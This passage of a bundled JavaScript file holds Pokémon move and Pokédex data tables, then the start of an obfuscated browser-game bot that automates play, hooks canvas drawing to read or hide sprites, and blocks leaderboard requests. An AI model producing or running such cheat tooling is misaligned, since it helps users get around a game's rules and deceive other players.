70, 38, 22, 23, 43, 71, 55, 72, 20], "marshadow": [95, 37, 83, 59], "naganadel": [80, 51, 7, 9, 64, 55, 20, 82], "stakataka": [32], "blacephalon": [51, 23, 71], "zeraora": [41, 95, 97], "meltan": [72, 20], "melmetal": [38, 37, 83, 71, 72, 20], "grookey": [82], "thwackey": [82], "rillaboom": [32, 25, 82], "scorbunny": [73, 82], "raboot": [73, 25, 82], "cinderace": [73, 25, 43, 82], "sobble": [25, 82], "drizzile": [25, 82], "inteleon": [80, 51, 38, 25, 43, 82, 89], "skwovet": [100, 25, 69], "greedent": [32, 100, 25, 69], "rookidee": [82], "corvisquire": [82], "corviknight": [82], "dottler": [70, 43, 71], "orbeetle": [70, 17, 43, 71], "nickit": [25, 97], "thievul": [25, 97, 23, 43, 82], "wooloo": [73, 72], "dubwool": [73, 72], "chewtle": [25], "drednaw": [32, 38, 25, 77], "yamper": [97], "boltund": [97], "flapple": [76, 61, 80, 82], "appletun": [32, 100], "silicobra": [37, 83], "sandaconda": [95, 37, 83], "cramorant": [38], "barraskewda": [38], "toxtricity": [64], "centiskorch": [71], "clobbopus": [25], "grapploct": [12, 25, 68], "sinistea": [51, 17, 52, 22, 23, 59], "polteageist": [51, 17, 52, 22, 23, 59], "hatenna": [51, 47, 98, 96, 17, 97, 72], "hattrem": [51, 47, 98, 96, 17, 97, 72], "hatterene": [51, 17, 43, 72], "impidimp": [72], "morgrem": [72], "grimmsnarl": [72], "obstagoon": [38, 25, 69, 43, 72, 20, 68], "perrserker": [51, 97, 69, 43, 20, 82], "cursola": [32, 17, 57, 12, 38, 85, 23, 37, 83, 68, 59], "runerigus": [51, 70, 23, 37, 83, 56, 59], "alcremie": [70, 17, 23, 71], "pincurchin": [64, 12, 55, 56], "frosmoth": [80, 47, 17, 97], "stonjourner": [32, 77], "eiscue": [12, 68], "indeedee": [47, 98, 96, 70, 97, 43], "morpeko": [95, 69], "dracozolt": [32, 8, 7, 37, 83], "arctozolt": [32, 12, 37, 83], "dracovish": [32, 37, 83], "arctovish": [37, 83], "duraludon": [51, 37, 83, 71, 72, 20], "dreepy": [72], "drakloak": [7, 12, 52, 72, 20, 82, 59], "dragapult": [7, 12, 52, 71, 72, 20, 82, 59], "zacian": [80, 49, 48], "zamazenta": [47, 49, 48, 97, 71], "eternatus": [8, 7, 49, 43, 71], "kubfu": [61, 48, 82], "urshifu": [61, 48, 37, 83, 82], "glastrier": [32, 25, 95], "spectrier": [32, 51, 96, 25, 52, 23, 59], "calyrex": [96, 25], "wyrdeer": [32, 70, 43, 71, 72, 20], "kleavor": [61, 80, 89], "ursaluna": [61, 48, 97, 37, 83, 69, 89], "basculegion": [38, 25, 52, 95], "sneasler": [61, 48, 37, 83, 43, 82], "overqwil": [100, 12, 38, 25, 43, 55], "enamorus": [95, 23], "sprigatito": [98, 97, 82], "floragato": [61, 98, 97, 82], "meowscarada": [61, 41, 98, 97, 85, 43, 55, 56, 82], "fuecoco": [98, 95, 69], "crocalor": [98, 95, 69], "skeledirge": [98, 52, 95, 69, 71], "quaxly": [61, 80, 98], "quaxwell": [61, 80, 98], "quaquaval": [61, 80, 98, 82], "lechonk": [32, 98, 25, 97, 69], "oinkologne": [32, 98, 70, 25, 97, 69], "tarountula": [17, 55, 56], "spidops": [61, 17, 83, 55, 56], "lokix": [61], "pawmi": [48, 97], "pawmo": [48, 97], "pawmot": [48, 97, 83, 69], "tandemaus": [61, 25, 97, 69, 72, 82], "maushold": [61, 25, 97, 69, 72, 82], "fidough": [25], "dachsbun": [25], "arboliva": [47], "nacli": [32, 49, 25], "naclstack": [32, 49, 25], "garganacl": [32, 49, 25], "charcadet": [52], "armarouge": [76, 41, 51, 70, 49, 52, 43, 71], "ceruledge": [94, 52, 89], "tadbulb": [76, 25], "bellibolt": [76, 25, 31], "wattrel": [82], "kilowattrel": [82], "bramblin": [52, 55], "rellor": [25, 83], "flittle": [98, 69, 82], "tinkatink": [37, 83, 72], "tinkatuff": [37, 83, 72], "tinkaton": [32, 37, 83, 72], "wiglett": [32, 38, 25], "wugtrio": [32, 38, 25], "finizen": [98, 96, 38], "palafin": [41, 98, 96, 38, 95], "varoom": [32], "revavroom": [32], "cyclizar": [61, 25, 20, 82], "orthworm": [32, 25, 37, 83, 77, 55], "glimmet": [47, 25, 77, 55], "glimmora": [47, 70, 49, 25, 77, 71, 55], "greavard": [32, 25, 52, 97], "houndstone": [32, 25, 52, 97, 59], "cetoddle": [32, 97], "cetitan": [32, 97], "veluza": [38], "dondozo": [32, 95, 37], "annihilape": [32, 52, 95, 37, 83, 69, 20, 82], "clodsire": [12, 37, 83], "farigiraf": [32, 47, 70, 52, 43, 72, 20], "dudunsparce": [80, 32, 7, 100, 64, 38, 25, 95, 37, 83, 43, 71, 20, 31], "kingambit": [61, 80, 83, 72], "colmilargo": [49, 97, 37, 83], "colagrito": [7, 100, 38, 83, 72, 20], "melenaleteo": [51, 70, 52, 85, 22, 72, 20], "reptalada": [61, 67, 17, 9, 59], "pelarena": [49, 85], "ferrosaco": [97, 82], "ferropalmas": [32, 97, 37, 83], "ferropolilla": [80, 35, 47, 70, 49, 23, 71, 82], "ferropúas": [32, 94, 45, 7, 38, 48, 77, 55], "arctibax": [61], "baxcalibur": [61, 32], "gholdengo": [47, 73, 52, 85, 23, 72, 20], "chi-yu": [64, 23], "bramaluna": [61, 80, 8, 7, 9, 12, 48, 37, 82], "ferropaladín": [61, 70, 64, 22, 23, 43, 72, 20], "koraidon": [32, 8, 67, 7, 9, 25, 71, 82], "ondulagua": [7, 25], "ferroverdor": [61, 80], "dipplin": [33, 100], "poltchageist": [52], "sinistcha": [52], "munkidori": [64, 52, 43, 82], "fezandipiti": [61, 80, 51, 9, 64, 43, 82], "ogerpon": [97, 83, 55, 82], "archaludon": [41, 51, 37, 83, 71, 72, 20], "hydrapple": [33, 100, 12], "terapagos": [41, 35, 51, 47, 70, 7, 49, 100, 38, 85, 37, 71, 20, 31] }, "dex": { "bulbasaur": 1, "ivysaur": 2, "venusaur": 3, "charmander": 4, "charmeleon": 5, "charizard": 6, "squirtle": 7, "wartortle": 8, "blastoise": 9, "caterpie": 10, "metapod": 11, "butterfree": 12, "weedle": 13, "kakuna": 14, "beedrill": 15, "pidgey": 16, "pidgeotto": 17, "pidgeot": 18, "rattata": 19, "raticate": 20, "spearow": 21, "fearow": 22, "ekans": 23, "arbok": 24, "pikachu": 25, "raichu": 26, "sandshrew": 27, "sandslash": 28, "nidoran♀": 29, "nidorina": 30, "nidoqueen": 31, "nidoran♂": 32, "nidorino": 33, "nidoking": 34, "clefairy": 35, "clefable": 36, "vulpix": 37, "ninetales": 38, "jigglypuff": 39, "wigglytuff": 40, "zubat": 41, "golbat": 42, "oddish": 43, "gloom": 44, "vileplume": 45, "paras": 46, "parasect": 47, "venonat": 48, "venomoth": 49, "diglett": 50, "dugtrio": 51, "meowth": 52, "persian": 53, "psyduck": 54, "golduck": 55, "mankey": 56, "primeape": 57, "growlithe": 58, "arcanine": 59, "poliwag": 60, "poliwhirl": 61, "poliwrath": 62, "abra": 63, "kadabra": 64, "alakazam": 65, "machop": 66, "machoke": 67, "machamp": 68, "bellsprout": 69, "weepinbell": 70, "victreebel": 71, "tentacool": 72, "tentacruel": 73, "geodude": 74, "graveler": 75, "golem": 76, "ponyta": 77, "rapidash": 78, "slowpoke": 79, "slowbro": 80, "magnemite": 81, "magneton": 82, "farfetch’d": 83, "doduo": 84, "dodrio": 85, "seel": 86, "dewgong": 87, "grimer": 88, "muk": 89, "shellder": 90, "cloyster": 91, "gastly": 92, "haunter": 93, "gengar": 94, "onix": 95, "drowzee": 96, "hypno": 97, "krabby": 98, "kingler": 99, "voltorb": 100, "electrode": 101, "exeggcute": 102, "exeggutor": 103, "cubone": 104, "marowak": 105, "hitmonlee": 106, "hitmonchan": 107, "lickitung": 108, "koffing": 109, "weezing": 110, "rhyhorn": 111, "rhydon": 112, "chansey": 113, "tangela": 114, "kangaskhan": 115, "horsea": 116, "seadra": 117, "goldeen": 118, "seaking": 119, "staryu": 120, "starmie": 121, "mr. mime": 122, "scyther": 123, "jynx": 124, "electabuzz": 125, "magmar": 126, "pinsir": 127, "tauros": 128, "magikarp": 129, "gyarados": 130, "lapras": 131, "ditto": 132, "eevee": 133, "vaporeon": 134, "jolteon": 135, "flareon": 136, "porygon": 137, "omanyte": 138, "omastar": 139, "kabuto": 140, "kabutops": 141, "aerodactyl": 142, "snorlax": 143, "articuno": 144, "zapdos": 145, "moltres": 146, "dratini": 147, "dragonair": 148, "dragonite": 149, "mewtwo": 150, "mew": 151, "chikorita": 152, "bayleef": 153, "meganium": 154, "cyndaquil": 155, "quilava": 156, "typhlosion": 157, "totodile": 158, "croconaw": 159, "feraligatr": 160, "sentret": 161, "furret": 162, "hoothoot": 163, "noctowl": 164, "ledyba": 165, "ledian": 166, "spinarak": 167, "ariados": 168, "crobat": 169, "chinchou": 170, "lanturn": 171, "pichu": 172, "cleffa": 173, "igglybuff": 174, "togepi": 175, "togetic": 176, "natu": 177, "xatu": 178, "mareep": 179, "flaaffy": 180, "ampharos": 181, "bellossom": 182, "marill": 183, "azumarill": 184, "sudowoodo": 185, "politoed": 186, "hoppip": 187, "skiploom": 188, "jumpluff": 189, "aipom": 190, "sunkern": 191, "sunflora": 192, "yanma": 193, "wooper": 194, "quagsire": 195, "espeon": 196, "umbreon": 197, "murkrow": 198, "slowking": 199, "misdreavus": 200, "unown": 201, "wobbuffet": 202, "girafarig": 203, "pineco": 204, "forretress": 205, "dunsparce": 206, "gligar": 207, "steelix": 208, "snubbull": 209, "granbull": 210, "qwilfish": 211, "scizor": 212, "shuckle": 213, "heracross": 214, "sneasel": 215, "teddiursa": 216, "ursaring": 217, "slugma": 218, "magcargo": 219, "swinub": 220, "piloswine": 221, "corsola": 222, "remoraid": 223, "octillery": 224, "delibird": 225, "mantine": 226, "skarmory": 227, "houndour": 228, "houndoom": 229, "kingdra": 230, "phanpy": 231, "donphan": 232, "porygon2": 233, "stantler": 234, "smeargle": 235, "tyrogue": 236, "hitmontop": 237, "smoochum": 238, "elekid": 239, "magby": 240, "miltank": 241, "blissey": 242, "raikou": 243, "entei": 244, "suicune": 245, "larvitar": 246, "pupitar": 247, "tyranitar": 248, "lugia": 249, "ho-oh": 250, "celebi": 251, "treecko": 252, "grovyle": 253, "sceptile": 254, "torchic": 255, "combusken": 256, "blaziken": 257, "mudkip": 258, "marshtomp": 259, "swampert": 260, "poochyena": 261, "mightyena": 262, "zigzagoon": 263, "linoone": 264, "wurmple": 265, "silcoon": 266, "beautifly": 267, "cascoon": 268, "dustox": 269, "lotad": 270, "lombre": 271, "ludicolo": 272, "seedot": 273, "nuzleaf": 274, "shiftry": 275, "taillow": 276, "swellow": 277, "wingull": 278, "pelipper": 279, "ralts": 280, "kirlia": 281, "gardevoir": 282, "surskit": 283, "masquerain": 284, "shroomish": 285, "breloom": 286, "slakoth": 287, "vigoroth": 288, "slaking": 289, "nincada": 290, "ninjask": 291, "shedinja": 292, "whismur": 293, "loudred": 294, "exploud": 295, "makuhita": 296, "hariyama": 297, "azurill": 298, "nosepass": 299, "skitty": 300, "delcatty": 301, "sableye": 302, "mawile": 303, "aron": 304, "lairon": 305, "aggron": 306, "meditite": 307, "medicham": 308, "electrike": 309, "manectric": 310, "plusle": 311, "minun": 312, "volbeat": 313, "illumise": 314, "roselia": 315, "gulpin": 316, "swalot": 317, "carvanha": 318, "sharpedo": 319, "wailmer": 320, "wailord": 321, "numel": 322, "camerupt": 323, "torkoal": 324, "spoink": 325, "grumpig": 326, "spinda": 327, "trapinch": 328, "vibrava": 329, "flygon": 330, "cacnea": 331, "cacturne": 332, "swablu": 333, "altaria": 334, "zangoose": 335, "seviper": 336, "lunatone": 337, "solrock": 338, "barboach": 339, "whiscash": 340, "corphish": 341, "crawdaunt": 342, "baltoy": 343, "claydol": 344, "lileep": 345, "cradily": 346, "anorith": 347, "armaldo": 348, "feebas": 349, "milotic": 350, "castform": 351, "kecleon": 352, "shuppet": 353, "banette": 354, "duskull": 355, "dusclops": 356, "tropius": 357, "chimecho": 358, "absol": 359, "wynaut": 360, "snorunt": 361, "glalie": 362, "spheal": 363, "sealeo": 364, "walrein": 365, "clamperl": 366, "huntail": 367, "gorebyss": 368, "relicanth": 369, "luvdisc": 370, "bagon": 371, "shelgon": 372, "salamence": 373, "beldum": 374, "metang": 375, "metagross": 376, "regirock": 377, "regice": 378, "registeel": 379, "latias": 380, "latios": 381, "kyogre": 382, "groudon": 383, "rayquaza": 384, "jirachi": 385, "deoxys": 386, "turtwig": 387, "grotle": 388, "torterra": 389, "chimchar": 390, "monferno": 391, "infernape": 392, "piplup": 393, "prinplup": 394, "empoleon": 395, "starly": 396, "staravia": 397, "staraptor": 398, "bidoof": 399, "bibarel": 400, "kricketot": 401, "kricketune": 402, "shinx": 403, "luxio": 404, "luxray": 405, "budew": 406, "roserade": 407, "cranidos": 408, "rampardos": 409, "shieldon": 410, "bastiodon": 411, "burmy": 412, "wormadam": 413, "mothim": 414, "combee": 415, "vespiquen": 416, "pachirisu": 417, "buizel": 418, "floatzel": 419, "cherubi": 420, "cherrim": 421, "shellos": 422, "gastrodon": 423, "ambipom": 424, "drifloon": 425, "drifblim": 426, "buneary": 427, "lopunny": 428, "mismagius": 429, "honchkrow": 430, "glameow": 431, "purugly": 432, "chingling": 433, "stunky": 434, "skuntank": 435, "bronzor": 436, "bronzong": 437, "bonsly": 438, "mime jr.": 439, "happiny": 440, "chatot": 441, "spiritomb": 442, "gible": 443, "gabite": 444, "garchomp": 445, "munchlax": 446, "riolu": 447, "lucario": 448, "hippopotas": 449, "hippowdon": 450, "skorupi": 451, "drapion": 452, "croagunk": 453, "toxicroak": 454, "carnivine": 455, "finneon": 456, "lumineon": 457, "mantyke": 458, "snover": 459, "abomasnow": 460, "weavile": 461, "magnezone": 462, "lickilicky": 463, "rhyperior": 464, "tangrowth": 465, "electivire": 466, "magmortar": 467, "togekiss": 468, "yanmega": 469, "leafeon": 470, "glaceon": 471, "gliscor": 472, "mamoswine": 473, "porygon-z": 474, "gallade": 475, "probopass": 476, "dusknoir": 477, "froslass": 478, "rotom": 479, "uxie": 480, "mesprit": 481, "azelf": 482, "dialga": 483, "palkia": 484, "heatran": 485, "regigigas": 486, "giratina": 487, "cresselia": 488, "phione": 489, "manaphy": 490, "darkrai": 491, "shaymin": 492, "arceus": 493, "victini": 494, "snivy": 495, "servine": 496, "serperior": 497, "tepig": 498, "pignite": 499, "emboar": 500, "oshawott": 501, "dewott": 502, "samurott": 503, "patrat": 504, "watchog": 505, "lillipup": 506, "herdier": 507, "stoutland": 508, "purrloin": 509, "liepard": 510, "pansage": 511, "simisage": 512, "pansear": 513, "panpour": 515, "munna": 517, "musharna": 518, "pidove": 519, "unfezant": 521, "roggenrola": 524, "boldore": 525, "gigalith": 526, "woobat": 527, "swoobat": 528, "drilbur": 529, "excadrill": 530, "audino": 531, "timburr": 532, "gurdurr": 533, "conkeldurr": 534, "tympole": 535, "palpitoad": 536, "seismitoad": 537, "sawk": 539, "sewaddle": 540, "swadloon": 541, "leavanny": 542, "venipede": 543, "whirlipede": 544, "scolipede": 545, "cottonee": 546, "whimsicott": 547, "petilil": 548, "lilligant": 549, "basculin": 550, "sandile": 551, "krokorok": 552, "krookodile": 553, "darumaka": 554, "darmanitan": 555, "maractus": 556, "dwebble": 557, "scraggy": 559, "scrafty": 560, "sigilyph": 561, "yamask": 562, "cofagrigus": 563, "archen": 566, "archeops": 567, "trubbish": 568, "garbodor": 569, "zorua": 570, "zoroark": 571, "minccino": 572, "cinccino": 573, "gothita": 574, "gothorita": 575, "gothitelle": 576, "solosis": 577, "duosion": 578, "reuniclus": 579, "ducklett": 580, "swanna": 581, "vanillite": 582, "vanillish": 583, "vanilluxe": 584, "deerling": 585, "sawsbuck": 586, "emolga": 587, "karrablast": 588, "escavalier": 589, "foongus": 590, "alomomola": 594, "joltik": 595, "galvantula": 596, "ferroseed": 597, "ferrothorn": 598, "klink": 599, "klang": 600, "klinklang": 601, "tynamo": 602, "eelektrik": 603, "eelektross": 604, "elgyem": 605, "beheeyem": 606, "litwick": 607, "lampent": 608, "chandelure": 609, "axew": 610, "fraxure": 611, "haxorus": 612, "cubchoo": 613, "beartic": 614, "cryogonal": 615, "accelgor": 617, "mienfoo": 619, "mienshao": 620, "druddigon": 621, "golett": 622, "golurk": 623, "pawniard": 624, "bisharp": 625, "rufflet": 627, "braviary": 628, "vullaby": 629, "mandibuzz": 630, "heatmor": 631, "durant": 632, "deino": 633, "zweilous": 634, "hydreigon": 635, "larvesta": 636, "volcarona": 637, "cobalion": 638, "terrakion": 639, "virizion": 640, "tornadus": 641, "thundurus": 642, "reshiram": 643, "zekrom": 644, "landorus": 645, "kyurem": 646, "keldeo": 647, "meloetta": 648, "genesect": 649, "chespin": 650, "quilladin": 651, "chesnaught": 652, "fennekin": 653, "braixen": 654, "delphox": 655, "froakie": 656, "frogadier": 657, "greninja": 658, "bunnelby": 659, "diggersby": 660, "fletchling": 661, "fletchinder": 662, "talonflame": 663, "scatterbug": 664, "spewpa": 665, "vivillon": 666, "litleo": 667, "flabébé": 669, "floette": 670, "florges": 671, "skiddo": 672, "gogoat": 673, "pancham": 674, "pangoro": 675, "furfrou": 676, "espurr": 677, "meowstic": 678, "honedge": 679, "doublade": 680, "aegislash": 681, "spritzee": 682, "swirlix": 684, "slurpuff": 685, "inkay": 686, "malamar": 687, "binacle": 688, "barbaracle": 689, "skrelp": 690, "dragalge": 691, "clauncher": 692, "clawitzer": 693, "helioptile": 694, "heliolisk": 695, "tyrunt": 696, "tyrantrum": 697, "amaura": 698, "aurorus": 699, "sylveon": 700, "hawlucha": 701, "dedenne": 702, "carbink": 703, "goomy": 704, "sliggoo": 705, "goodra": 706, "klefki": 707, "phantump": 708, "trevenant": 709, "pumpkaboo": 710, "gourgeist": 711, "bergmite": 712, "avalugg": 713, "noibat": 714, "noivern": 715, "xerneas": 716, "yveltal": 717, "zygarde": 718, "diancie": 719, "hoopa": 720, "volcanion": 721, "rowlet": 722, "dartrix": 723, "decidueye": 724, "litten": 725, "torracat": 726, "incineroar": 727, "popplio": 728, "brionne": 729, "primarina": 730, "pikipek": 731, "yungoos": 734, "grubbin": 736, "charjabug": 737, "vikavolt": 738, "crabrawler": 739, "crabominable": 740, "oricorio": 741, "cutiefly": 742, "ribombee": 743, "rockruff": 744, "lycanroc": 745, "wishiwashi": 746, "mareanie": 747, "toxapex": 748, "mudbray": 749, "mudsdale": 750, "dewpider": 751, "araquanid": 752, "fomantis": 753, "lurantis": 754, "morelull": 755, "salandit": 757, "salazzle": 758, "stufful": 759, "bewear": 760, "bounsweet": 761, "steenee": 762, "tsareena": 763, "comfey": 764, "passimian": 766, "wimpod": 767, "golisopod": 768, "sandygast": 769, "palossand": 770, "pyukumuku": 771, "type: null": 772, "silvally": 773, "minior": 774, "komala": 775, "turtonator": 776, "togedemaru": 777, "mimikyu": 778, "bruxish": 779, "drampa": 780, "dhelmise": 781, "jangmo-o": 782, "hakamo-o": 783, "kommo-o": 784, "tapu koko": 785, "tapu lele": 786, "tapu bulu": 787, "tapu fini": 788, "cosmog": 789, "cosmoem": 790, "solgaleo": 791, "lunala": 792, "nihilego": 793, "buzzwole": 794, "pheromosa": 795, "xurkitree": 796, "celesteela": 797, "kartana": 798, "guzzlord": 799, "necrozma": 800, "magearna": 801, "marshadow": 802, "poipole": 803, "naganadel": 804, "stakataka": 805, "blacephalon": 806, "zeraora": 807, "meltan": 808, "melmetal": 809, "grookey": 810, "thwackey": 811, "rillaboom": 812, "scorbunny": 813, "raboot": 814, "cinderace": 815, "sobble": 816, "drizzile": 817, "inteleon": 818, "skwovet": 819, "greedent": 820, "rookidee": 821, "corvisquire": 822, "corviknight": 823, "blipbug": 824, "dottler": 825, "orbeetle": 826, "nickit": 827, "thievul": 828, "gossifleur": 829, "eldegoss": 830, "wooloo": 831, "dubwool": 832, "chewtle": 833, "drednaw": 834, "yamper": 835, "boltund": 836, "applin": 840, "flapple": 841, "appletun": 842, "silicobra": 843, "sandaconda": 844, "cramorant": 845, "arrokuda": 846, "barraskewda": 847, "toxel": 848, "toxtricity": 849, "sizzlipede": 850, "centiskorch": 851, "clobbopus": 852, "grapploct": 853, "sinistea": 854, "polteageist": 855, "hatenna": 856, "hattrem": 857, "hatterene": 858, "impidimp": 859, "morgrem": 860, "grimmsnarl": 861, "obstagoon": 862, "perrserker": 863, "cursola": 864, "runerigus": 867, "milcery": 868, "alcremie": 869, "pincurchin": 871, "snom": 872, "frosmoth": 873, "stonjourner": 874, "eiscue": 875, "indeedee": 876, "morpeko": 877, "dracozolt": 880, "arctozolt": 881, "dracovish": 882, "arctovish": 883, "duraludon": 884, "dreepy": 885, "drakloak": 886, "dragapult": 887, "zacian": 888, "zamazenta": 889, "eternatus": 890, "kubfu": 891, "urshifu": 892, "regieleki": 894, "regidrago": 895, "glastrier": 896, "spectrier": 897, "calyrex": 898, "wyrdeer": 899, "kleavor": 900, "ursaluna": 901, "basculegion": 902, "sneasler": 903, "overqwil": 904, "enamorus": 905, "sprigatito": 906, "floragato": 907, "meowscarada": 908, "fuecoco": 909, "crocalor": 910, "skeledirge": 911, "quaxly": 912, "quaxwell": 913, "quaquaval": 914, "lechonk": 915, "oinkologne": 916, "tarountula": 917, "spidops": 918, "nymble": 919, "lokix": 920, "pawmi": 921, "pawmo": 922, "pawmot": 923, "tandemaus": 924, "maushold": 925, "fidough": 926, "dachsbun": 927, "smoliv": 928, "arboliva": 930, "nacli": 932, "naclstack": 933, "garganacl": 934, "charcadet": 935, "armarouge": 936, "ceruledge": 937, "tadbulb": 938, "bellibolt": 939, "wattrel": 940, "kilowattrel": 941, "bramblin": 946, "capsakid": 951, "scovillain": 952, "rellor": 953, "flittle": 955, "tinkatink": 957, "tinkatuff": 958, "tinkaton": 959, "wiglett": 960, "wugtrio": 961, "finizen": 963, "palafin": 964, "varoom": 965, "revavroom": 966, "cyclizar": 967, "orthworm": 968, "glimmet": 969, "glimmora": 970, "greavard": 971, "houndstone": 972, "cetoddle": 974, "cetitan": 975, "veluza": 976, "dondozo": 977, "tatsugiri": 978, "annihilape": 979, "clodsire": 980, "farigiraf": 981, "dudunsparce": 982, "kingambit": 983, "colmilargo": 984, "colagrito": 985, "melenaleteo": 987, "reptalada": 988, "pelarena": 989, "ferrosaco": 991, "ferropalmas": 992, "ferropolilla": 994, "ferropúas": 995, "frigibax": 996, "arctibax": 997, "baxcalibur": 998, "gholdengo": 1000, "chi-yu": 1004, "bramaluna": 1005, "ferropaladín": 1006, "koraidon": 1007, "ondulagua": 1009, "ferroverdor": 1010, "dipplin": 1011, "poltchageist": 1012, "sinistcha": 1013, "munkidori": 1015, "fezandipiti": 1016, "ogerpon": 1017, "archaludon": 1018, "hydrapple": 1019, "terapagos": 1024 } };
        },
        "core/bot.js": () => {
            (function start(tries = 0) {
                if (!window.PSBotSite)
                    return void console.warn(_0xstr(0x516));
                const h = {};
                const SITE = window.PSBotSite(h);
                if (!SITE.ready()) {
                    const status = document.getElementById(_0xstr(0x517));
                    if (status && tries === 20)
                        status.textContent = _0xstr(0x518);
                    return void setTimeout(() => start(tries + 1), 500);
                }
                if (window.PSBot)
                    window.PSBot.unload();
                const VERSION = _0xstr(0x519);
                const REPO = _0xstr(0x51a);
                const CFG = {
                    contact: 80,
                    engage: 120,
                    bossRange: 170,
                    bossEngage: 210,
                    lowHp: 0.5,
                    hurtDrop: 0.25,
                    hurtWindow: 2000,
                    hurtHold: 4000,
                    fleeWeight: 15,
                    crowdFlee: Infinity,
                    fleeCrowdWeight: 8,
                    zCrowd: 8,
                    zCrowdLow: 3,
                    huntWeight: 3,
                    huntHp: 0.75,
                    huntCrowd: 8,
                    goodRange: 1500,
                    goodWeight: 5,
                    riftWeight: 40,
                    riftIgnore: 3000,
                    prizeWeight: 10,
                    questWeight: 10,
                    questHp: 0.7,
                    questCrowd: 3,
                    magnet: 100,
                    xpRange: 900,
                    xpWeight: 4,
                    caseReach: 25,
                    caseTime: 5500,
                    holdHp: 0.25,
                    pinTime: 2000,
                    pinMove: 30,
                    breakRange: 500,
                    buffReach: 80,
                    buffCooldown: 30000,
                    healBelow: 0.8,
                    healReach: 18,
                    healIdle: 1500,
                    healIgnore: 45000,
                    lookahead: 140,
                    cell: 32,
                    pathRadius: 48,
                    bodyRadius: 14,
                    pathMaxNodes: 6000,
                    aim: false,
                    hazardMargin: 40,
                    shotLookahead: 600,
                    autoTelegraph: true,
                    enemyRe: SITE.enemyRe,
                    hideNear: 170,
                    tags: { ...SITE.tags },
                    autoPick: true,
                    useItems: true,
                    itemKeys: [_0xstr(0x51b), _0xstr(0x51c), _0xstr(0x51d), _0xstr(0x51e)],
                    itemEvery: 1000,
                    swapSkills: true,
                    swapEvery: 10,
                    evoRe: /evol|evoluc|awaken|despert|unlock|desbloq|tiến hoá|★|⭐/i,
                    maxSkills: 4,
                    builds: {},
                    autoRestart: true,
                    restartSteps: [
                        /^(play again|try again|retry|restart|jugar de nuevo|volver a jugar|reintentar|otra vez|chơi lại)/i,
                        /^(back to menu|volver al men[uú]|về menu)/i,
                        /^(play|jugar|chơi)/i,
                        /^(start|go!?|let'?s go|comenzar|empezar|bắt đầu)/i,
                        /^(back|menu|volver|ok|aceptar|close|cerrar|đóng|not now|ahora no|got it|entendido)$/i,
                    ],
                    restartAvoid: /together|juntos|friend|amigo|gacha|shop|tienda|log ?out|sign|link|delete|borrar|revive|revivir|gem|buy|comprar/i,
                    background: true,
                    blockRank: true,
                    rankRe: /rank|leader|board|score|season/i,
                    logNet: true,
                    ...SITE.cfg,
                };
                let canvas = SITE.canvas() || document.createElement(_0xstr(0x51f));
                const state = {
                    on: false, target: 0, done: 0, debug: false, keys: {}, dir: null, frame: [], lastFrame: [], texts: [], hudTexts: new Set(),
                    posHist: [], walls: [], ignore: [], stuck: [], escape: null, pickAt: 0, netBlocked: 0, picks: {}, newSkills: 0,
                    magnet: CFG.magnet, prevXp: [],
                };
                const log = (...a) => console.log(_0xstr(0x520), _0xstr(0x521), ...a);
                const DATA = window.PSBotData || {};
                Object.assign(CFG.tags, DATA.tags);
                const userBuilds = { ...DATA.builds };
                const TAG_KEY = _0xstr(0x522), TAG_VER = _0xstr(0x523), defaultTags = { ...CFG.tags };
                try {
                    let saved = JSON.parse(localStorage.getItem(TAG_KEY) || _0xstr(0x524));
                    if (localStorage.getItem(TAG_VER) !== _0xstr(0x525)) {
                        const sizeTag = k => defaultTags[k.split(_0xstr(0x526))[0]] || (SITE.bySize && SITE.bySize[k.split(_0xstr(0x527))[0]]);
                        saved = Object.fromEntries(Object.entries(saved).filter(([k, v]) => !(k in defaultTags) && !(v === _0xstr(0x528) && sizeTag(k) === _0xstr(0x529))));
                        localStorage.setItem(TAG_KEY, JSON.stringify(saved));
                        localStorage.setItem(TAG_VER, _0xstr(0x52a));
                    }
                    for (const [k, v] of Object.entries(saved))
                        if (v === null)
                            delete CFG.tags[k];
                        else
                            CFG.tags[k] = v;
                }
                catch { }
                const saveTags = () => {
                    const diff = {};
                    for (const k in CFG.tags)
                        if (CFG.tags[k] !== defaultTags[k])
                            diff[k] = CFG.tags[k];
                    for (const k in defaultTags)
                        if (!(k in CFG.tags))
                            diff[k] = null;
                    try {
                        localStorage.setItem(TAG_KEY, JSON.stringify(diff));
                    }
                    catch { }
                };
                const BUILD_KEY = _0xstr(0x52b);
                try {
                    Object.assign(userBuilds, JSON.parse(localStorage.getItem(BUILD_KEY) || _0xstr(0x52c)));
                }
                catch { }
                const idTable = SITE.moveTable || window.PSBotMoves || { moves: [] };
                const byGameId = ids => ids.map(id => (idTable.moves.find(m => m.id === id) || { name: id }).name);
                const defaultBuilds = SITE.id === _0xstr(0x52d) ? {
                    mewtwo: byGameId([_0xstr(0x52e), _0xstr(0x52f), _0xstr(0x530), _0xstr(0x531)]),
                    kyogre: byGameId([_0xstr(0x532), _0xstr(0x533), _0xstr(0x534), _0xstr(0x535)]),
                    bulbasaur: byGameId([_0xstr(0x536), _0xstr(0x537), _0xstr(0x538), _0xstr(0x539)]),
                } : {};
                const isDefaultBuild = (n, b) => String(defaultBuilds[n]) === String(b);
                Object.assign(CFG.builds, defaultBuilds, userBuilds);
                for (const k in CFG.builds)
                    if (!CFG.builds[k].length)
                        delete CFG.builds[k];
                const P = CanvasRenderingContext2D.prototype;
                const origDraw = P.drawImage, origArc = P.arc;
                const canvasKeys = new WeakMap();
                const srcName = img => {
                    if (img.src)
                        return img.src.replace(location.origin, '');
                    let k = canvasKeys.get(img);
                    if (!k) {
                        k = `canvas:${img.width}x${img.height}`;
                        try {
                            const d = img.getContext(_0xstr(0x53a)).getImageData(0, 0, img.width, img.height).data;
                            let h = 0;
                            for (let i = 0; i < d.length; i += 4)
                                h = (h * 31 + d[i] + d[i + 1] * 7 + d[i + 2] * 13 + d[i + 3] * 17) | 0;
                            k += _0xstr(0x53b) + (h >>> 0).toString(36);
                        }
                        catch { }
                        canvasKeys.set(img, k);
                    }
                    return k;
                };
                const tagOf = src => CFG.tags[src] || (SITE.sizeTags ? CFG.tags[src.split(_0xstr(0x53c))[0]] : SITE.bySize && SITE.bySize[src.split(_0xstr(0x53d))[0]]) || undefined;
                const record = (ctx, src, cx, cy, w, h, img, rect) => {
                    const m = ctx.getTransform();
                    const item = { src, x: m.a * cx + m.c * cy + m.e, y: m.b * cx + m.d * cy + m.f, w: w * m.a, h: h * m.d, s: m.a, e: m.e, f: m.f, img, rect };
                    state.frame.push(item);
                    return item;
                };
                const hideEnemy = (it, mode) => {
                    if (!CFG.enemyRe.test(it.src))
                        return false;
